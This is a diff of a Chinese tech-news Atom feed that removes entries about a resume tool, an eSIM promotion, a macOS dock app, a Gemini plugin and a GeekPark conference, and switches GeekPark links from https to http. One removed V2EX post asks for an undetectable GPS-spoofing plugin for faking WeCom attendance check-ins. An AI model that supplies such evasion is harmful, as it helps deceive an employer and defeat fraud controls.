-&lt;p&gt;可以在线分享简历，发送简历的时候，直接发送链接就可以了。获得链接的人可以在网页上查看。&lt;/p&gt;
-&lt;p&gt;修改简历后，再次保存到云端即可更新分享页的内容。可以随时关闭分享、更换链接。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;官网 &lt;a href="https://viviresume.com/"&gt;viviresume.com&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;完全免费、无需登录。&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:8872c28a-0c52-5007-966a-6319a69ac577</id>
-    <title>[Apple] V 友们，有无虚拟定位的插件/软件</title>
-    <updated>2026-11-27T11:09:14.000Z</updated>
-    <author>
-      <name>llCnll</name>
-    </author>
-    <published>2026-11-27T11:09:14.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260425#reply2"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;V 友们求一个虚拟定位的插件，不会被企微发现的那种。&lt;/p&gt;
-&lt;p&gt;WLoc 因为版本信任问题用不了了。&lt;br /&gt;
-用爱思助手给自己的 iPhone 7 P 越狱，然后从插件商店装了一个虚拟定位插件。&lt;/p&gt;
-&lt;p&gt;早上用这个插件在企业微信试打过一次卡。晚上再次打卡时，企微提示账号可能有被封禁的风险，并要求重新登录。想确认一下，这个提示有没有可能是因为插件返回的定位数据带有「模拟定位」标记，触发了企微的风控。&lt;/p&gt;
-&lt;p&gt;我希望实现的效果&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;可以直接在 iPhone 上设置虚拟定位，无需借助电脑或其他设备。或者借助其他设备(电脑)能保持长时间有效的。&lt;/li&gt;
-&lt;li&gt;可以直接修改底层返回的定位数据，并且返回结果里没有「模拟定位」标记。&lt;/li&gt;
-&lt;li&gt;偶尔上班快迟到时，能在路上打卡，希望企微不会识别出虚拟定位。&lt;/li&gt;
-&lt;/ul&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:58c07f1a-7d97-58d7-b2f6-a1fc0187ad78</id>
-    <title>[推广] 去香港、澳门，中途回深圳也能接着用：一张旅行 eSIM，三地共用 5 GB，US$7.98</title>
-    <updated>2026-11-27T11:06:14.000Z</updated>
-    <author>
-      <name>MartinZBE</name>
-    </author>
-    <published>2026-11-27T11:06:14.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260424#reply0"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;大家好，我是 RoamFort 的运营。给最近有港澳行程的朋友分享一款我们在卖的旅行 eSIM。&lt;/p&gt;
-&lt;p&gt;比如从深圳去香港待两天，下周再去澳门，只要还在 30 天有效期内，这几段行程都能用同一张 eSIM，剩余流量接着用。&lt;strong&gt;US$7.98 是整张卡的价格，5 GB 是三地合计流量。&lt;/strong&gt; 有效期从第一次连上支持的网络开始算。&lt;/p&gt;
-&lt;p&gt;下单时填一个能收信的邮箱就能付款，可以游客结账。买之前记得确认两件事：手机的具体型号支持旅行 eSIM，而且没有运营商锁。这款套餐只提供上网，收短信验证码要用自己的号码。&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://roamfort.shop/products/0453d478-ebd9-432c-b408-f10714b48095?utm_source=v2ex&amp;amp;utm_medium=community&amp;amp;utm_campaign=hk_macau_5gb"&gt;查看套餐、覆盖网络和安装说明&lt;/a&gt;&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:bf186813-d718-54e2-b8ff-1efb89d8ef28</id>
-    <title>[分享创造] DualDock 完全免费开源的 mac 端支持多屏独立配置、文件夹收纳图标的 dock 工具</title>
-    <updated>2026-11-27T11:05:42.000Z</updated>
-    <author>
-      <name>autumncry</name>
-    </author>
-    <published>2026-11-27T11:05:42.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260423#reply0"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;实在受不了 Mac 原生 dock 了，前前后后花了不少时间不少 token 做了个 app，自己用了一段时间，体验不错，分享给大家。&lt;/p&gt;
-&lt;p&gt;主要解决 2 个痛点：&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;外接显示器时，mac 原生 dock 无法在多个屏幕同时显示，只能自动跟随。&lt;/li&gt;
-&lt;li&gt;原生 dock 无法收纳 app&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;DualDock 在解决这两个痛点的同时，尽可能保持和原生 dock 类似的体验，包括动画、预览、大小设置等等；并且尽量增加设置自定义的自由度。&lt;/p&gt;
-&lt;p&gt;最后，纯个人喜好，加入了 widget，可以翻页显示 widget，显示系统状态、天气、日历、音乐控件等等，也支持 coding plan 余量查询。（我目前主力 codex 和 gemini，claude 和 cursor 支持但没有套餐来测试）&lt;/p&gt;
-&lt;p&gt;欢迎大家试用反馈。&lt;/p&gt;
-&lt;p&gt;不要钱，不发码，不订阅，完全开源。喜欢的给点个 star 就行。&lt;/p&gt;
-&lt;p&gt;地址：&lt;a href="https://github.com/autumncry/DualDock"&gt;https://github.com/autumncry/DualDock&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;a href="https://yunxiansy.github.io/yunxian-feeds/media/e12f1ae2fbcf5667a5a570b12605cac86ee1c2dc11b16de50c69a26db9a5f3cf.png" target="_blank"&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/e12f1ae2fbcf5667a5a570b12605cac86ee1c2dc11b16de50c69a26db9a5f3cf.png" /&gt;&lt;/a&gt;&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:d1bde982-6a13-5f1f-9461-69e1ed0c803e</id>
-    <title>[程序员] [开源自荐]买谷歌黑五半价 pro 的看过来-在 dsh 中不违反 tos 的情况下使用 agy-gemini</title>
-    <updated>2026-11-27T11:02:10.000Z</updated>
-    <author>
-      <name>Vaspike</name>
-    </author>
-    <published>2026-11-27T11:02:10.000Z</published>
-    <link rel="alternate" href="https://www.v2ex.com/t/1260422#reply1"/>
-    <category term="IT 科技"/>
-    <content type="html">
-	&lt;p&gt;&lt;a href="https://github.com/vaspike/dsh-antigravity-native"&gt;dsh-antigravity-native&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt="image" loading="lazy" src="https://yunxiansy.github.io/yunxian-feeds/media/e4db0ceac0a261e2d1e4c375e6d1cc5e5a5357650964dabe8072962be14e7b5a.png" /&gt;&lt;br /&gt;
-优势:&lt;br /&gt;
-0. 不是反代不是反代, 是 ACP 和 agy cli 调用实现的&lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;
-&lt;p&gt;直观来讲, 可以理解为使用的一直是 agy 的 cli, 连 session 也是 agy 的 session, 只是给 agy 的 cli 套了个壳子, 把使用入口和渲染处尽量融合到 dsh 原生界面, dsh 的模型选择处可见所有 agy 已登录账户的可用模型&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;不注入任何上下文和 skill, tool_ues 也是 agy 自己的不会使用 dsh 中的任何配置, 最大可能的不违反 google 的 tos, 现在 google 不开放 agy 第三方 oauth 时的最佳权宜之计了&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;随时可以在 agy 自己的 cli 和 destop 中找到你在 dsh 中用 gemini 模型创建出来使用的 session, 历史内容完全一致&lt;/p&gt;
-&lt;/li&gt;
-&lt;li&gt;
-&lt;p&gt;不可能出现丢上下文的情况(这也是我之前使用类似插件总遇到的问题), 因为上下文始终就是交给 agy 自己管理的, dsh 只是一个可视化渲染&lt;/p&gt;
-&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;局限: &lt;/p&gt;
-&lt;ol&gt;
-&lt;li&gt;无法 fork 使用 gemini 模型新建的会话, 工作量所限目前还没做&lt;/li&gt;
-&lt;li&gt;gemini 模型新建的会话不能切换回 dsh 原生配置的模型继续对话, 同样 dsh 原生模型创建的会话也不能切换成 gemini 的模型继续会话&lt;/li&gt;
-&lt;li&gt;无法看到 agy 下模型使用情况和剩余额度&lt;/li&gt;
-&lt;li&gt;性能问题暂时没专门调整, 后续会优化, 感谢理解&lt;/li&gt;
-&lt;li&gt;会在 agy cli 或 desktop 的会话历史中看到请求生成 session name 的会话, 不过依然是不改 agy 系统提示词的, 只不过用户提示词里有 SYSTEM 字样, 后续我会考虑更优雅的方式, 目前也只能这样了, 这种 session 可以随时在 agy 里自己删掉, 是不和 dsh 绑定的&lt;/li&gt;
-&lt;/ol&gt;
-&lt;p&gt;安装方式我就不赘述了, readme 里有, 建议使用 npm 安装, 欢迎试用和 star(星来!)&lt;br /&gt;
-至于为什么我一定要用 dsh, 我有我的理由, 相信也有很多人也希望能这样使用会因为不同的理由, 感谢理解&lt;/p&gt;
-&lt;p&gt;顺便也自荐下自己的另一个 dsh 插件: &lt;a href="https://github.com/vaspike/dsh-usage-stat"&gt;dsh-usage-stat&lt;/a&gt;&lt;/p&gt;
-
-	</content>
-    <source>
-      <title>V2EX</title>
-      <link rel="self" href="https://www.v2ex.com/index.xml"/>
-      <link rel="alternate" href="https://www.v2ex.com/"/>
     </source>
   </entry>
   <entry>
@@ -2666,7 +2700,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -3120,7 +3154,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -3376,7 +3410,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -3748,7 +3782,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -4447,23 +4481,6 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     </source>
   </entry>
   <entry>
-    <id>urn:uuid:b5b73eca-f971-5c3d-b985-a66b0df2ec87</id>
-    <title>Siri AI 开发者预览版让 iOS、iPadOS 和 macOS 应用能够与 Siri 集成</title>
-    <updated>2026-11-26T12:00:00.000Z</updated>
-    <author>
-      <name>InfoQ 中文站</name>
-    </author>
-    <published>2026-11-26T12:00:00.000Z</published>
-    <link rel="alternate" href="https://www.infoq.cn/article/j1aQzS6OrB9aDlChCwiQ?utm_source=rss&amp;utm_medium=article"/>
-    <category term="IT 科技"/>
-    <content type="html">&lt;div&gt;&lt;a href="https://www.infoq.cn/article/j1aQzS6OrB9aDlChCwiQ?utm_source=rss&amp;amp;utm_medium=article"&gt;点击查看原文&amp;gt;&lt;/a&gt;&lt;/div&gt;</content>
-    <source>
-      <title>InfoQ 中文站</title>
-      <link rel="self" href="https://www.infoq.cn/feed.xml"/>
-      <link rel="alternate" href="https://www.infoq.cn"/>
-    </source>
-  </entry>
-  <entry>
     <id>urn:uuid:dc342205-7b65-53ac-8d43-f15a011ebdd4</id>
     <title>App+1｜Agora：开源、易用、好用，给 Android 用户的 LLM 聊天工具</title>
     <updated>2026-11-26T09:30:00.000Z</updated>
@@ -4639,7 +4656,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -4723,7 +4740,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -4994,7 +5011,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5103,7 +5120,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5339,7 +5356,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5404,24 +5421,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:a3fc2be4-37b8-512f-8a24-11562678b6b4</id>
-    <title>怀旧手记｜Palm Pre：内藏「划时代」系统的手机</title>
-    <updated>2026-11-25T03:07:41.000Z</updated>
-    <author>
-      <name>少数派</name>
-    </author>
-    <published>2026-11-25T03:07:41.000Z</published>
-    <link rel="alternate" href="https://sspai.com/post/118791"/>
-    <category term="IT 科技"/>
-    <content type="html">Matrix首页推荐Matrix是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选Matrix最优质的文章，展示来自用户的最真实的体验和观点。文章代表作者个人观点 ...&lt;a href="https://sspai.com/post/118791" target="_blank"&gt;查看全文&lt;/a&gt;</content>
-    <source>
-      <title>少数派</title>
-      <link rel="self" href="https://sspai.com/feed"/>
-      <link rel="alternate" href="https://sspai.com"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5501,7 +5501,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5593,7 +5593,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5657,7 +5657,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5702,7 +5702,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5788,7 +5788,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5856,7 +5856,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5901,7 +5901,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -5966,7 +5966,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -6078,7 +6078,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -6230,7 +6230,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -6300,7 +6300,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -6374,7 +6374,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -6441,7 +6441,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -6528,7 +6528,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -6610,7 +6610,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -6683,7 +6683,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -7147,7 +7147,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -7212,7 +7212,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
+      <link rel="alternate" href="http://mainssl.geekpark.net/rss.rss"/>
     </source>
   </entry>
   <entry>
@@ -7295,101 +7295,7 @@ libsystem_c, CoreFoundation, Foundation, AppKit, AE, HIToolbox, dyld
     <source>
       <title>极客公园</title>
       <link rel="self" href="https://www.geekpark.net/rss"/>
-      <link rel="alternate" href="https://mainssl.geekpark.net/rss.rss"/>
-    </source>
-  </entry>
-  <entry>
-    <id>urn:uuid:3c939624-97e7-565e-bddc-96f669e9df02</id>
-    <title>影视飓风、Manus、影石、OPPO......极客公园创新大会 2027 嘉宾阵容更新！</title>
-    <updated>2026-11-18T04:12:11.000Z</updated>
-    <author>
-      <name>极客公园</name>
-    </author>
-    <published>2026-11-18T04:12:11.000Z</published>
-    <link rel="alternate" href="http://www.geekpark.net/news/374125"/>
-    <category term="IT 科技"/>
-    <content type="html">&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/f1e997d707d3fb338aaf76e1f971b97ecdbd16c2455b58fddc2b911990b5da3c.png" /&gt;&lt;/p&gt;
-&lt;p&gt;首批嘉宾公布以来，IF 2027 收到了超出预期的关注， 短短几天早鸟票已经售罄。&lt;/p&gt;
-&lt;p&gt;今年 IF 大会的主题是：&lt;strong&gt;「Revaluation 价值，另有答案」。&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;过去一年，AI 正在以超出预期的速度改变世界。变化越来越快，但真正重要的问题并没有变得更简单：下一轮机会在哪里？哪些行业正在发生根本性的变化？当旧的经验和规则不再适用，我们又该如何做出新的判断？&lt;/p&gt;
-&lt;p&gt;我们希望 IF 大会呈现的，正是这个时代最值得关注的议题、最有代表性的行动者，以及那些值得被认真听见的思考。&lt;/p&gt;
-&lt;p&gt;12 月 5-6 日，北京 798艺术区。我们期待与所有关心科技、相信创新、愿意亲自参与变化的人相聚。在这里听见源头的声音，认识正在行动的人，参与那些尚未有答案的讨论，并将新的判断带回各自的工作与生活。&lt;/p&gt;
-&lt;p&gt;今天新的一批嘉宾揭晓，相信也一定有更多你希望来现场交流的人。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/bf99f14eee98443b15fc13447a870249de55af5ab220db7178bd1bfbfda8ab42.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/2fad210a4d7b7e937fc30afbd89270e0ba7254a1deda3ee75a34676f1c9138ed.png" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/3a1219ffaeab70c3060ada00bb302c7d547b80c577f88cb6f57cf475482f2b54.png" /&gt;&lt;/p&gt;
-&lt;p&gt;极客公园创始人 &amp;amp; CEO，IF 大会发起人。&lt;/p&gt;
-&lt;p&gt;当旧的规则正在失效，今年 IF，他将与身处 AI 浪潮最前沿、正在创造未来的人展开对谈，寻找价值重估后的新答案。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/aab9949155885bc9a5f5426cc6888a093c647d271ae8b62bab23fce85ff79433.png" /&gt;&lt;/p&gt;
-&lt;p&gt;2015 年，他创办影石Insta360。十年后，他在上海敲响上市铜锣，成为科创板首位 90 后创始人。在他的带领下，影石全景相机销量连续多年位居全球前列。&lt;/p&gt;
-&lt;p&gt;今年 IF，他将和影视飓风 Tim 一起推演一个对相机公司和创作者都不太客气的问题：当 AI 能生成影像，谁还需要一台相机？一段影像，又凭什么值得看？&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/c86c189e50e022213dc40353f413fadb0fa46d222c88ccc5cce4c4a9293c0312.png" /&gt;&lt;/p&gt;
-&lt;p&gt;从豌豆荚、神策数据到字节国际化业务、光年之外，再到联合创立 Manus：他做过移动互联网、SaaS、AI 三个时代的产品。&lt;/p&gt;
-&lt;p&gt;作为全球 Agent 产品的标杆，来到 IF，他将和极客公园创始人 &amp;amp; CEO 张鹏探讨 Manus 内部正在进行的 AI Native 组织实践，以及，这些尝试意味着未来 AI Agent 与人之间将如何更好地协作。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/cdbf1fafcf0e34ef52a0d0cefd3391e513b270d066de2b99b9ee65cf0307b6fb.png" /&gt;&lt;/p&gt;
-&lt;p&gt;从个人视频账号成长为全平台粉丝超过 8000 万的内容团队。&lt;/p&gt;
-&lt;p&gt;毕业于英国肯特大学电影系，Tim 既是自媒体创作者，也是企业经营者，影响着中国数字影像创作生态的塑造：器材测评、幕后纪实、自制短片，几乎覆盖了影像生产的每一环。&lt;/p&gt;
-&lt;p&gt;AI 时代，专业创作者如何重新定义自己的价值？听听 Tim 怎么看。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/64bb051eb3dc11004fef937e86146ef088fa93a48a862a2379bb4de23e78edf8.png" /&gt;&lt;/p&gt;
-&lt;p&gt;此前，OPPO 把智能做进系统，融进手机用户日常。2026 年 11 月，OPPO 成立 AI 新硬件实验室，要把「个性化的主动智能」从手机挪到更多终端。&lt;/p&gt;
-&lt;p&gt;当所有手机厂商都在谈 AI 时，什么体验才算真的质变？OPPO  AI新硬件实验室负责人姜昱辰，将在 IF 现场分享她的洞察。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/9f31da09eaf7a6e1b8c0cb0efe1d58b9b3c19e294535f7e3dc13c8d07a40841a.png" /&gt;&lt;/p&gt;
-&lt;p&gt;深耕传统影视行业二十余年，先后在中国教育电视台、中央电视台、灿星文化、华策影视与优酷工作，参与过《中国好声音》《了不起的挑战》等节目，并担任张艺谋综艺《跨界冰雪王》的执行总导演。&lt;/p&gt;
-&lt;p&gt;2023 年底，他用 AI 生成了一支《山海经》预告片，刷屏全网；如今，正以 AI 重新组织影像创作的流程、成本与想象力。他要聊聊，当人人都能生成大片，真正稀缺的是什么。&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/0ff27fad63c6011d420b4ae5a95b5fb1d288e500faebc7d0a566c687fae5e17a.png" /&gt;&lt;/p&gt;
-&lt;p&gt;95 后，2020 年创立影眸Hyper3D。作为全球率先定义 3D 生成底层框架的团队，影眸Hyper3D 已获多轮大额融资。其 B 端客户规模领跑行业，覆盖游戏、电商、具身、空间计算等核心赛道。他将带来 Hyper3D 的最新探索并分享对 3D 生成下一阶段的思考。&lt;/p&gt;
-&lt;section&gt;&lt;/section&gt;
-&lt;p&gt;&lt;img src="https://yunxiansy.github.io/yunxian-feeds/media/b6d3bc8062546beba8556c9cd27dbd4ae415b6c6db48ed7201695e1c8654fb85.png" /&gt;&lt;/p&gt;
-&lt;p&gt;Adyen 大中华区技术交付负责人，长期深耕全球支付与中国企业出海，参与多个头部企业全球支付底座建设。&lt;/p&gt;
-&lt;p&gt;当 AI 从技术创新走向商业落地，用户在用、Token 在烧，如何真正把投入变成收入？当 Agent 开始替人下单，支付链路也在面临重构。&lt;/p&gt;
-&lt;p&gt;在 IF，他将解构「支付」如何成为连接 AI 企业与真实商业价值的关键基础设施。&lt;/p&gt;
